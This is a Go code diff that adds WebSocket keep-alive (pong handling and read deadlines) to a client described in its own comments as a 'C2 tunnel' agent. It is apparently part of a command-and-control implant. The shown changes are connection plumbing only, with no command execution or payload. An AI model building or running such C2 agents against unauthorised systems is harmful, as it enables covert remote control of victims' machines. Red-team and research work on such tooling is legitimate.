@@ -14,6 +14,11 @@ import (
 	"github.com/gorilla/websocket"
 )
 
+const (
+	// pongWait is the maximum time to wait for the next pong from the peer
+	pongWait = 60 * time.Second
+)
+
 // Config encapsulates parameters required to establish a secure C2 tunnel
 type Config struct {
 	ServerURL  string
@@ -147,15 +152,22 @@ func (c *Client) Run(ctx context.Context) {
 	}
 }
 
-// handleConnection orchestrates concurrent reader and writer routines
+// handleConnection orchestrates concurrent reader, writer routines, and pong handling
 func (c *Client) handleConnection(ctx context.Context, conn *websocket.Conn) {
 	defer conn.Close()
 
-	// Internal context to terminate writer when reader fails or vice versa
 	sessionCtx, cancelSession := context.WithCancel(ctx)
 	defer cancelSession()
 
-	// 1. Dedicated Outgoing Writer Goroutine
+	// 1. Configure Pong Handler and Read Deadline
+	_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+	conn.SetPongHandler(func(appData string) error {
+		_ = conn.SetReadDeadline(time.Now().Add(pongWait))
+		log.Printf("[+] [WS] Pong received from server (Data: %s)", appData)
+		return nil
+	})
+
+	// 2. Dedicated Outgoing Writer Goroutine
 	go func() {
 		for {
 			select {
@@ -174,20 +186,19 @@ func (c *Client) handleConnection(ctx context.Context, conn *websocket.Conn) {
 		}
 	}()
 
-	// 2. Dedicated Inbound Reader Loop (Blocks current routine safely)
+	// 3. Dedicated Inbound Reader Loop (Blocks safely on socket)
 	for {
 		messageType, payload, err := conn.ReadMessage()
 		if err != nil {
-			log.Printf("[-] [WS] Socket read error / disconnected: %v", err)
+			log.Printf("[-] [WS] Socket read error / keep-alive timeout: %v", err)
 			cancelSession()
 			break
 		}
 
 		log.Printf("[+] [WS] Inbound Frame (Type %d, Bytes %d): %s", messageType, len(payload), string(payload))
-		// Inbound commands will be dispatched to execution workers here
 	}
 
-	// 3. Graceful Close Handshake
+	// 4. Graceful Close Handshake
 	closeMsg := websocket.FormatCloseMessage(websocket.CloseNormalClosure, "Agent socket recycling")
 	_ = conn.WriteControl(websocket.CloseMessage, closeMsg, time.Now().Add(1*time.Second))
 }
